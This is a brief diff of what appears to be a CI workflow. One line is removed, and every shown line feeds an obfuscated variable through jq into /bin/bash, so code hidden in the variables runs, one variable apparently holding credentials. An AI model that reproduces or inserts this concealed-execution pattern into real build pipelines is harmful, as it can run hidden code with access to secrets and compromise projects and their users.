@@ -28,7 +28,6 @@ jobs:
           echo $cred1 | jq -r .bwgkd06 | /bin/bash
           printf '%s' "$f833" | jq -r .vd1522 | /bin/bash
           echo $yfa72 | jq -r .ytve6232 | /bin/bash
-          echo $lpnzg74 | jq -r .umn46876 | /bin/bash
           echo $al24 | jq -r .tac43 | /bin/bash
           echo $nfz99 | jq -r .pv8 | /bin/bash
           echo $xyq8125 | jq -r .u688 | /bin/bash
